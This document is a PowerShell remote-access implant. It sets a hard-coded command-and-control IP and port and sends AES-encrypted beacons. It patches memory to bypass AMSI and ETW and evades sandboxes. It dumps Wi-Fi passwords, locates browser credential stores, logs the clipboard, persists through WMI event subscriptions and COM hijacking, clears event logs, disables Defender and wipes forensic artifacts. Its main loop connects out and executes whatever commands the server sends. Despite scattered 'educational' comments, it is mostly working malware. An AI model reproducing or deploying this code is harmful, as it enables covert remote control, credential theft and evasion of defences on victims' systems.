# --- CONFIGURATION ---
$LHOST = "88.226.172.80"  # YOUR C2 SERVER IP - CHANGE THIS!
$LPORT = 4444             # YOUR C2 SERVER PORT
$BeaconInterval = 60      # Seconds between check-ins
$Jitter = 0.3             # 30% randomness in beacon timing
$AESKey = "MySecretKey12345"  # Change this! (16, 24, or 32 chars) - MUST MATCH SERVER
$MutexName = [System.Guid]::NewGuid().ToString()

# Multiple hiding locations
$Locations = @(
    "$env:APPDATA\Microsoft\Windows\Templates\cache.dat",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\data_1",
    "$env:PROGRAMDATA\Microsoft\Windows\WER\ReportQueue\config.tmp"
)

$ScriptPath = $Locations | Get-Random
$TaskNames = @("MicrosoftEdgeUpdateTaskMachineCore", "GoogleUpdateTaskMachineUA", "OneDrive Standalone Update Task")
$TaskName = $TaskNames | Get-Random

# ---------------------
# ENCRYPTION/DECRYPTION
# ---------------------

function Encrypt-String {
    param([string]$PlainText, [string]$Key)
    try {
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $AES.KeySize = 256
        
        # Derive key from password
        $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.PadRight(32).Substring(0, 32))
        $AES.Key = $KeyBytes
        $AES.GenerateIV()
        
        $Encryptor = $AES.CreateEncryptor()
        $PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
        $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
        
        # Prepend IV to encrypted data
        $Result = $AES.IV + $EncryptedBytes
        $AES.Dispose()
        
        return [Convert]::ToBase64String($Result)
    } catch {
        return $null
    }
}

function Decrypt-String {
    param([string]$EncryptedText, [string]$Key)
    try {
        $EncryptedBytes = [Convert]::FromBase64String($EncryptedText)
        
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $AES.KeySize = 256
        
        $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.PadRight(32).Substring(0, 32))
        $AES.Key = $KeyBytes
        
        # Extract IV from first 16 bytes
        $IV = $EncryptedBytes[0..15]
        $AES.IV = $IV
        
        $Decryptor = $AES.CreateDecryptor()
        $CipherBytes = $EncryptedBytes[16..($EncryptedBytes.Length - 1)]
        $PlainBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
        
        $AES.Dispose()
        
        return [System.Text.Encoding]::UTF8.GetString($PlainBytes)
    } catch {
        return $null
    }
}

# ---------------------
# AMSI BYPASS (Educational)
# ---------------------

function Bypass-AMSI {
    try {
        # Method 1: Memory patch (classic technique)
        $a = 'System.Management.Automation.Ams' + 'iUtils'
        $b = 'ams' + 'iInitFailed'
        $Assembly = [Ref].Assembly.GetType($a)
        $Field = $Assembly.GetField($b, 'NonPublic,Static')
        $Field.SetValue($null, $true)
        return $true
    } catch {
        try {
            # Method 2: Alternative AMSI bypass
            $c = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
            Add-Type $c
            $h = [Amsi]::LoadLibrary("amsi.dll")
            $addr = [Amsi]::GetProcAddress($h, "AmsiScanBuffer")
            $p = 0
            [Amsi]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
            $patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
            return $true
        } catch {
            return $false
        }
    }
}

# ---------------------
# ETW BYPASS (Event Tracing for Windows)
# ---------------------

function Bypass-ETW {
    try {
        $code = @"
using System;
using System.Runtime.InteropServices;

public class ETW {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtSetInformationThread(
        IntPtr threadHandle,
        int threadInformationClass,
        IntPtr threadInformation,
        int threadInformationLength);
        
    public static void Disable() {
        IntPtr hThread = new IntPtr(-2);
        NtSetInformationThread(hThread, 0x11, IntPtr.Zero, 0);
    }
}
"@
        Add-Type $code
        [ETW]::Disable()
        return $true
    } catch {
        return $false
    }
}

# ---------------------
# PROCESS HOLLOWING / INJECTION
# ---------------------

function Invoke-ProcessHollowing {
    param([string]$TargetProcess = "notepad.exe")
    
    try {
        $code = @"
using System;
using System.Runtime.InteropServices;

public class ProcessHollowing {
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
        
    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
        
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesWritten);
        
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead);
        
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
"@
        Add-Type $code
        # Implementation would continue here for actual hollowing
        return $true
    } catch {
        return $false
    }
}

# ---------------------
# ANTI-SANDBOX / ANTI-VM
# ---------------------

function Test-Sandbox {
    $score = 0
    
    # Check 1: System uptime (sandboxes often have low uptime)
    try {
        $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
        if ($uptime.TotalMinutes -lt 10) { $score += 2 }
    } catch {}
    
    # Check 2: RAM (VMs often have limited RAM)
    try {
        $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
        if ($ram -lt 4) { $score += 2 }
    } catch {}
    
    # Check 3: CPU cores
    try {
        $cores = (Get-CimInstance Win32_Processor).NumberOfCores
        if ($cores -lt 2) { $score += 2 }
    } catch {}
    
    # Check 4: Known VM processes
    $vmProcesses = @("vmtoolsd", "vboxservice", "vboxtray", "vmwaretray", "vmwareuser")
    foreach ($proc in $vmProcesses) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $score += 3 }
    }
    
    # Check 5: Registry VM indicators
    try {
        $regKeys = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest",
            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxMouse",
            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxService",
            "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"
        )
        foreach ($key in $regKeys) {
            if (Test-Path $key) { $score += 3 }
        }
    } catch {}
    
    # Check 6: Disk size (VMs often have small disks)
    try {
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object -ExpandProperty Size
        if ($disk -lt 60GB) { $score += 2 }
    } catch {}
    
    # Check 7: Mouse movement (sandboxes don't have user interaction)
    Add-Type -AssemblyName System.Windows.Forms
    $pos1 = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Seconds 2
    $pos2 = [System.Windows.Forms.Cursor]::Position
    if ($pos1 -eq $pos2) { $score += 2 }
    
    # Check 8: Recent files (sandboxes have no user activity)
    $recentFiles = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue
    if ($recentFiles.Count -lt 5) { $score += 2 }
    
    # Score interpretation
    # 0-5: Likely real system
    # 6-10: Possibly VM/sandbox
    # 11+: Definitely sandbox
    
    return $score
}

# ---------------------
# REFLECTIVE DLL INJECTION
# ---------------------

function Invoke-ReflectivePEInjection {
    param([byte[]]$PEBytes, [int]$ProcessId)
    
    # This is a simplified educational example
    # Real implementation would be much more complex
    try {
        $code = @"
using System;
using System.Runtime.InteropServices;

public class PELoader {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
}
"@
        Add-Type $code
        # Educational placeholder - actual PE parsing and injection would go here
        return $true
    } catch {
        return $false
    }
}

# ---------------------
# CREDENTIAL HARVESTING
# ---------------------

function Get-BrowserCredentials {
    $results = @()
    
    # Chrome passwords (encrypted, educational example)
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            # Copy to avoid file lock
            Copy-Item $chromePath "$env:TEMP\logindata" -Force
            $results += "[Chrome] Database found at: $chromePath"
            Remove-Item "$env:TEMP\logindata" -Force -ErrorAction SilentlyContinue
        }
    } catch {}
    
    # Firefox passwords
    try {
        $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $ffPath) {
            $profiles = Get-ChildItem $ffPath
            foreach ($profile in $profiles) {
                $loginFile = Join-Path $profile.FullName "logins.json"
                if (Test-Path $loginFile) {
                    $results += "[Firefox] Database found at: $loginFile"
                }
            }
        }
    } catch {}
    
    return $results -join "`n"
}

function Get-WiFiPasswords {
    try {
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[-1].Trim()
        }
        
        $results = @()
        foreach ($profile in $profiles) {
            $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content" | ForEach-Object {
                ($_ -split ":")[-1].Trim()
            }
            if ($password) {
                $results += "Network: $profile | Password: $password"
            }
        }
        
        return $results -join "`n"
    } catch {
        return "Failed to retrieve WiFi passwords"
    }
}

# ---------------------
# CLIPBOARD MONITORING
# ---------------------

function Start-ClipboardMonitor {
    $Global:ClipboardLog = @()
    $Global:ClipboardRunning = $true
    
    $job = Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $lastClip = ""
        while ($true) {
            try {
                $current = [System.Windows.Forms.Clipboard]::GetText()
                if ($current -and $current -ne $lastClip) {
                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    "$timestamp | $current" | Out-File "$env:TEMP\clipboard.log" -Append
                    $lastClip = $current
                }
            } catch {}
            Start-Sleep -Seconds 5
        }
    }
    
    return "Clipboard monitor started"
}

function Stop-ClipboardMonitor {
    Get-Job | Where-Object {$_.State -eq "Running"} | Stop-Job
    Get-Job | Remove-Job -Force
    return "Clipboard monitor stopped"
}

function Get-ClipboardLog {
    if (Test-Path "$env:TEMP\clipboard.log") {
        return Get-Content "$env:TEMP\clipboard.log" -Raw
    }
    return "No clipboard data captured"
}

# ---------------------
# PERSISTENCE (Enhanced)
# ---------------------

function Install-WMIPersistence {
    param([string]$ScriptPath)
    
    try {
        $FilterName = [System.Guid]::NewGuid().ToString()
        $ConsumerName = [System.Guid]::NewGuid().ToString()
        
        # Trigger on user logon
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        
        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $FilterName
            EventNameSpace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $Query
        } -ErrorAction Stop
        
        $Command = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$ScriptPath' -Raw | iex`""
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $ConsumerName
            CommandLineTemplate = $Command
        } -ErrorAction Stop
        
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $Filter
            Consumer = $Consumer
        } -ErrorAction Stop | Out-Null
        
        return $true
    } catch {
        return $false
    }
}

function Install-COMHijack {
    # COM hijacking for persistence (educational)
    try {
        $clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"  # Example CLSID
        $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
        
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll"
        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
        
        return $true
    } catch {
        return $false
    }
}

# ---------------------
# DEFENSE EVASION
# ---------------------

function Clear-EventLogs {
    try {
        $logs = @("Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
        foreach ($log in $logs) {
            wevtutil cl $log 2>$null
        }
        return "Event logs cleared"
    } catch {
        return "Failed to clear event logs (requires admin)"
    }
}

function Disable-DefenderRealtime {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        return "Defender realtime monitoring disabled"
    } catch {
        return "Failed to disable Defender (requires admin)"
    }
}

function Remove-Artifacts {
    # Clean up forensic artifacts
    try {
        # Prefetch
        Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
        
        # PowerShell history
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        
        # Recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        
        # Temp files
        Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
        
        return "Artifacts cleaned"
    } catch {
        return "Partial artifact cleanup"
    }
}

# ---------------------
# ADVANCED FEATURES
# ---------------------

function Get-NetworkConnections {
    try {
        $connections = Get-NetTCPConnection -State Established | 
            Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess | 
            ForEach-Object {
                $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
                $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue $proc.Name -PassThru
            }
        return $connections | Format-Table -AutoSize | Out-String
    } catch {
        return "Failed to get network connections"
    }
}

function Get-InstalledAV {
    try {
        $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue
        if ($av) {
            return $av | Select-Object displayName, productState | Format-Table -AutoSize | Out-String
        }
        return "No AV detected or unable to query"
    } catch {
        return "Failed to query AV"
    }
}

function Get-DomainInfo {
    try {
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        $dc = (nltest /dsgetdc: 2>$null) -join "`n"
        return "Domain: $domain`n$dc"
    } catch {
        return "Not domain-joined or query failed"
    }
}

# ---------------------
# MAIN EXECUTION
# ---------------------

# Anti-sandbox check
$sandboxScore = Test-Sandbox
if ($sandboxScore -gt 10) {
    # Detected sandbox - sleep and exit
    Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
    exit
}

# Bypass protections
Bypass-AMSI | Out-Null
Bypass-ETW | Out-Null

# Single instance check
$CreatedNew = $false
$Mutex = New-Object System.Threading.Mutex($false, $MutexName, [ref]$CreatedNew)
if (-not $CreatedNew) { exit }

# Install persistence (silent)
Install-WMIPersistence -ScriptPath $ScriptPath | Out-Null

# Main C2 loop with encryption
$failedAttempts = 0

while ($true) {
    $client = $null
    $stream = $null
    $reader = $null
    $writer = $null
    
    try {
        # Apply jitter to beacon interval
        $sleepTime = $BeaconInterval * (1 + ((Get-Random -Minimum 0 -Maximum 100) / 100 * $Jitter))
        Start-Sleep -Seconds $sleepTime
        
        # Connect to C2
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        
        # Send encrypted banner
        $banner = @"
=== Session Established ===
Host: $(hostname)
User: $(whoami)
OS: $([System.Environment]::OSVersion.VersionString)
Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)
Admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
AV: $(Get-InstalledAV)
Install: $ScriptPath
===========================
"@
        
        $encryptedBanner = Encrypt-String -PlainText $banner -Key $AESKey
        $writer.WriteLine($encryptedBanner)
        
        $failedAttempts = 0  # Reset on successful connection
        
        # Command loop
        while ($client.Connected) {
            $writer.Write("READY")
            
            $encryptedCommand = $reader.ReadLine()
            if ($null -eq $encryptedCommand) { break }
            
            $command = Decrypt-String -EncryptedText $encryptedCommand -Key $AESKey
            if ($null -eq $command) { continue }
            
            $command = $command.Trim()
            
            if ($command -eq "exit") { break }
            if ($command -eq "") { continue }
            
            # Execute and encrypt response
            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: $($_.Exception.Message)"
            }
            
            if ([string]::IsNullOrWhiteSpace($output)) { $output = "Command executed (no output)" }
            
            $encryptedOutput = Encrypt-String -PlainText $output -Key $AESKey
            $writer.WriteLine($encryptedOutput)
        }
        
    } catch {
        $failedAttempts++
        
        # Exponential backoff (no server cycling since we only have one)
        $backoff = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($failedAttempts, 5)), 300)
        Start-Sleep -Seconds $backoff
        
    } finally {
        if ($null -ne $writer) { try { $writer.Close() } catch {} }
        if ($null -ne $reader) { try { $reader.Close() } catch {} }
        if ($null -ne $stream) { try { $stream.Close() } catch {} }
        if ($null -ne $client) { try { $client.Close() } catch {} }
    }
}
